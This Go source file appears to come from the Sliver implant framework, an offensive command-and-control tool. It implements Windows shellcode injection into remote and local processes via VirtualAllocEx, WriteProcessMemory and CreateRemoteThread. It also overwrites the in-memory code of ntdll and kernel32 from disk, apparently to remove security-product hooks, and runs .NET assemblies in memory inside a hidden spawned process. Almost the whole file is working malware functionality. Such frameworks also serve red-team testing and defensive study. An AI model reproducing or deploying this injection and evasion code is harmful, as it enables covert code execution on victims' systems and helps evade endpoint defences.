package taskrunner

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"debug/pe"
	"fmt"
	"io"
	"io/ioutil"
	// {{if .Debug}}
	"log"
	// {{else}}{{end}}
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/bishopfox/sliver/sliver/version"
)

const (
	MEM_COMMIT          = 0x001000
	MEM_RESERVE         = 0x002000
	BobLoaderOffset     = 0x00000af0
	PROCESS_ALL_ACCESS  = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
	MAX_ASSEMBLY_LENGTH = 1025024
	STILL_ACTIVE        = 259
)

var (
	kernel32               = syscall.MustLoadDLL("kernel32.dll")
	procVirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
	procVirtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
	procVirtualProtect     = kernel32.MustFindProc("VirtualProtect")
	procVirtualProtectEx   = kernel32.MustFindProc("VirtualProtectEx")
	procWriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
	procCreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
	procCreateThread       = kernel32.MustFindProc("CreateThread")
	procGetExitCodeThread  = kernel32.MustFindProc("GetExitCodeThread")

	ntdllPath       = "C:\\Windows\\System32\\ntdll.dll" // We make this a var so the string obfuscator can refactor it
	kernel32dllPath = "C:\\Windows\\System32\\kernel32.dll"
)

func virtualProtect(lpAddress uintptr, size, newProtect uint, oldProtect unsafe.Pointer) error {
	r1, _, err := procVirtualProtect.Call(lpAddress, uintptr(size), uintptr(newProtect), uintptr(oldProtect))
	if uint(r1) == 0 {
		return err
	}
	return nil
}

func virtualProtectEx(handle syscall.Handle, lpAddress uintptr, size, newProtect uint, oldProtect unsafe.Pointer) error {
	r1, _, err := procVirtualProtectEx.Call(uintptr(handle), lpAddress, uintptr(size), uintptr(newProtect), uintptr(oldProtect))
	if uint(r1) == 0 {
		return err
	}
	return nil
}

func virtualAllocEx(process syscall.Handle, addr uintptr, size, allocType, protect uint32) (uintptr, error) {
	r1, _, e1 := procVirtualAllocEx.Call(
		uintptr(process),
		addr,
		uintptr(size),
		uintptr(allocType),
		uintptr(protect))

	if int(r1) == 0 {
		return r1, os.NewSyscallError("VirtualAllocEx", e1)
	}
	return r1, nil
}

func writeProcessMemory(process syscall.Handle, addr uintptr, buf unsafe.Pointer, size uint32) (uint32, error) {
	var nLength uint32
	r1, _, e1 := procWriteProcessMemory.Call(
		uintptr(process),
		addr,
		uintptr(buf),
		uintptr(size),
		uintptr(unsafe.Pointer(&nLength)))

	if int(r1) == 0 {
		return nLength, os.NewSyscallError("WriteProcessMemory", e1)
	}
	return nLength, nil
}

func createRemoteThread(process syscall.Handle, sa *syscall.SecurityAttributes, stackSize uint32, startAddress, parameter uintptr, creationFlags uint32) (syscall.Handle, uint32, error) {
	var threadID uint32
	r1, _, e1 := procCreateRemoteThread.Call(
		uintptr(process),
		uintptr(unsafe.Pointer(sa)),
		uintptr(stackSize),
		startAddress,
		parameter,
		uintptr(creationFlags),
		uintptr(unsafe.Pointer(&threadID)))
	runtime.KeepAlive(sa)
	if int(r1) == 0 {
		return syscall.InvalidHandle, 0, os.NewSyscallError("CreateRemoteThread", e1)
	}
	return syscall.Handle(r1), threadID, nil
}


func getExitCodeThread(threadHandle syscall.Handle) (uint32, error) {
	var exitCode uint32
	r1, _, e1 := procGetExitCodeThread.Call(
		uintptr(threadHandle),
		uintptr(unsafe.Pointer(&exitCode)))
	if r1 == 0 {
		return exitCode, e1
	}
	return exitCode, nil
}

func sysAlloc(size int, rwxPages bool) (uintptr, error) {
	perms := syscall.PAGE_EXECUTE_READWRITE
	if !rwxPages {
		perms = syscall.PAGE_READWRITE
	}
	n := uintptr(size)
	addr, _, err := procVirtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, uintptr(perms))
	if addr == 0 {
		return 0, err
	}
	return addr, nil
}

func ptr(val interface{}) uintptr {
	switch val.(type) {
	case string:
		return uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(val.(string))))
	case int:
		return uintptr(val.(int))
	default:
		return uintptr(0)
	}
}

func RefreshPE(name string) error {
	//{{if .Debug}}
	log.Printf("Reloading %s...\n", name)
	//{{end}}
	df, e := ioutil.ReadFile(name)
	if e != nil {
		return e
	}
	f, e := pe.Open(name)
	if e != nil {
		return e
	}

	x := f.Section(".text")
	ddf := df[x.Offset:x.Size]
	return writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
}

func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, vsize uint32) error {
	t, e := syscall.LoadDLL(pn)
	if e != nil {
		return e
	}
	h := t.Handle
	dllBase := uintptr(h)

	dllOffset := uint(dllBase) + uint(virtualoffset)

	var old int
	kernel32 := syscall.NewLazyDLL("kernel32.dll")

	virtprot := kernel32.NewProc("VirtualProtect")
	r, _, e := virtprot.Call(
		uintptr(dllOffset),
		uintptr(len(b)),
		uintptr(0x40),
		uintptr(unsafe.Pointer(&old)),
	)
	if int(r) == 0 {
		return e
	}
	//{{if .Debug}}
	log.Println("Made memory map RWX")
	//{{end}}

	for i := 0; i < len(b); i++ {
		loc := uintptr(dllOffset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = b[i]
	}

	//{{if .Debug}}
	log.Println("DLL overwritten")
	//{{end}}

	r, _, e = virtprot.Call(
		uintptr(dllOffset),
		uintptr(len(b)),
		uintptr(old),
		uintptr(unsafe.Pointer(&old)),
	)
	if int(r) == 0 {
		return e
	}
	//{{if .Debug}}
	log.Println("Restored memory map permissions")
	//{{end}}
	return nil
}

// injectTask - Injects shellcode into a process handle
func injectTask(processHandle syscall.Handle, data []byte, rwxPages bool) error {
	var (
		err        error
		remoteAddr uintptr
	)
	dataSize := len(data)
	// Remotely allocate memory in the target process
	// {{if .Debug}}
	log.Println("allocating remote process memory ...")
	// {{end}}
	if rwxPages {
		remoteAddr, err = virtualAllocEx(processHandle, 0, uint32(dataSize), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
	} else {
		remoteAddr, err = virtualAllocEx(processHandle, 0, uint32(dataSize), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
	}
	// {{if .Debug}}
	log.Printf("virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
	// {{end}}
	if err != nil {
		// {{if .Debug}}
		log.Println("[!] failed to allocate remote process memory")
		// {{end}}
		return err
	}

	// Write the shellcode into the remotely allocated buffer
	_, err = writeProcessMemory(processHandle, remoteAddr, unsafe.Pointer(&data[0]), uint32(dataSize))
	// {{if .Debug}}
	log.Printf("writeprocessmemory returned: err = %v", err)
	// {{end}}
	if err != nil {
		// {{if .Debug}}
		log.Printf("[!] failed to write data into remote process")
		// {{end}}
		return err
	}
	if !rwxPages {
		var oldProtect int
		// Set proper page permissions
		err = virtualProtectEx(processHandle, remoteAddr, uint(dataSize), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
		if err != nil {
			//{{if .Debug}}
			log.Println("VirtualProtectEx failed:", err)
			//{{end}}
			return err
		}
	}
	// Create the remote thread to where we wrote the shellcode
	// {{if .Debug}}
	log.Println("successfully injected data, starting remote thread ....")
	// {{end}}
	attr := new(syscall.SecurityAttributes)
	_, _, err = createRemoteThread(processHandle, attr, 0, uintptr(remoteAddr), 0, 0)
	// {{if .Debug}}
	log.Printf("createremotethread returned:  err = %v", err)
	// {{end}}
	if err != nil {
		// {{if .Debug}}
		log.Printf("[!] failed to create remote thread")
		// {{end}}
		return err
	}
	return nil
}

// RermoteTask - Injects Task into a processID using remote threads
func RemoteTask(processID int, data []byte, rwxPages bool) error {
	var err error
	// Hotfix for #114
	// Somehow this fucks up everything on Windows 8.1
	// so we're skipping the RefreshPE calls.
	if version.GetVersion() != "6.3 build 9600" {
		err = RefreshPE(ntdllPath)
		if err != nil {
			//{{if .Debug}}
			log.Printf("RefreshPE on ntdll failed: %v\n", err)
			//{{end}}
			return err
		}
		err = RefreshPE(kernel32dllPath)
		if err != nil {
			//{{if .Debug}}
			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
			//{{end}}
			return err
		}
	}
	processHandle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(processID))
	if processHandle == 0 {
		return err
	}
	err = injectTask(processHandle, data, rwxPages)
	if err != nil {
		return err
	}
	return nil
}

func LocalTask(data []byte, rwxPages bool) error {
	var err error
	// Hotfix for #114
	// Somehow this fucks up everything on Windows 8.1
	// so we're skipping the RefreshPE calls.
	if version.GetVersion() != "6.3 build 9600" {
		err = RefreshPE(ntdllPath)
		if err != nil {
			//{{if .Debug}}
			log.Printf("RefreshPE on ntdll failed: %v\n", err)
			//{{end}}
			return err
		}
		err = RefreshPE(kernel32dllPath)
		if err != nil {
			//{{if .Debug}}
			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
			//{{end}}
			return err
		}
	}
	size := len(data)
	addr, _ := sysAlloc(size, rwxPages)
	buf := (*[9999999]byte)(unsafe.Pointer(addr))
	for index := 0; index < size; index++ {
		buf[index] = data[index]
	}
	if !rwxPages {
		var oldProtect int
		err = virtualProtect(addr, uint(size), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
		if err != nil {
			//{{if .Debug}}
			log.Println("VirtualProtect failed:", err)
			//{{end}}
			return err
		}
	}
	// {{if .Debug}}
	log.Printf("creating local thread with start address: 0x%08x", addr)
	// {{end}}
	_, _, err = procCreateThread.Call(0, 0, addr, 0, 0, 0)
	return err
}

func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeout int32) (string, error) {
	err := RefreshPE(ntdllPath)
	if err != nil {
		return "", err
	}
	err = RefreshPE(kernel32dllPath)
	if err != nil {
		return "", err
	}
	// {{if .Debug}}
	log.Println("[*] Assembly size:", len(assembly))
	log.Println("[*] Hosting dll size:", len(hostingDll))
	// {{end}}
	if len(assembly) > MAX_ASSEMBLY_LENGTH {
		return "", fmt.Errorf("please use an assembly smaller than %d", MAX_ASSEMBLY_LENGTH)
	}
	cmd := exec.Command(process)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	var stdoutBuf, stderrBuf bytes.Buffer
	stdoutIn, _ := cmd.StdoutPipe()
	stderrIn, _ := cmd.StderrPipe()

	var errStdout, errStderr error
	err = cmd.Start()
	if err != nil {
		//{{if .Debug}}
		log.Println("Could not start process:", process)
		//{{end}}
		return "", err
	}
	pid := cmd.Process.Pid
	// {{if .Debug}}
	log.Printf("[*] %s started, pid = %d\n", process, pid)
	// {{end}}
	// OpenProcess with PROC_ACCESS_ALL
	handle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
	if err != nil {
		return "", err
	}
	// VirtualAllocEx to allocate a new memory segment into the target process
	hostingDllAddr, err := virtualAllocEx(handle, 0, uint32(len(hostingDll)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
	if err != nil {
		return "", err
	}
	// WriteProcessMemory to write the reflective loader into the process
	_, err = writeProcessMemory(handle, hostingDllAddr, unsafe.Pointer(&hostingDll[0]), uint32(len(hostingDll)))
	if err != nil {
		return "", err
	}
	// {{if .Debug}}
	log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", hostingDllAddr)
	// {{end}}
	// Total size to allocate = assembly size + 1024 bytes for the args
	totalSize := uint32(MAX_ASSEMBLY_LENGTH)
	// VirtualAllocEx to allocate another memory segment for hosting the .NET assembly and args
	assemblyAddr, err := virtualAllocEx(handle, 0, totalSize, MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
	if err != nil {
		return "", err
	}
	// Padd arguments with 0x00 -- there must be a cleaner way to do that
	paramsBytes := []byte(params)
	padding := make([]byte, 1024-len(params))
	final := append(paramsBytes, padding...)
	// Final payload: params + assembly
	final = append(final, assembly...)
	// WriteProcessMemory to write the .NET assembly + args
	_, err = writeProcessMemory(handle, assemblyAddr, unsafe.Pointer(&final[0]), uint32(len(final)))
	if err != nil {
		return "", err
	}
	// {{if .Debug}}
	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(final), assemblyAddr)
	// {{end}}
	// Apply R-X perms
	var oldProtect int
	err = virtualProtectEx(handle, hostingDllAddr, uint(len(hostingDll)), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
	if err != nil {
		//{{if .Debug}}
		log.Println("VirtualProtectEx failed:", err)
		//{{end}}
		return "", err
	}
	// CreateRemoteThread(DLL addr + offset, assembly addr)
	attr := new(syscall.SecurityAttributes)
	threadHandle, _, err := createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
	if err != nil {
		return "", err
	}
	// {{if .Debug}}
	log.Printf("[*] RemoteThread started. Waiting for execution to finish.\n")
	// {{end}}
	for {
		code, err := getExitCodeThread(threadHandle)
		// log.Println(code)
		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
			// {{if .Debug}}
			log.Printf("[-] Error when waiting for remote thread to exit: %s\n", err.Error())
			// {{end}}
			return "", err
		}
		if code == STILL_ACTIVE {
			time.Sleep(time.Second)
		} else {
			break
		}
	}
	cmd.Process.Kill()
	go func() {
		_, errStdout = io.Copy(&stdoutBuf, stdoutIn)
	}()
	_, errStderr = io.Copy(&stderrBuf, stderrIn)

	if errStdout != nil {
		return "", errStdout
	}
	if errStderr != nil {
		return "", errStderr
	}
	outStr, _ := string(stdoutBuf.Bytes()), string(stderrBuf.Bytes())
	// {{if .Debug}}
	log.Println("[*] Output:")
	log.Println(outStr)
	// {{end}}
	return outStr, nil
}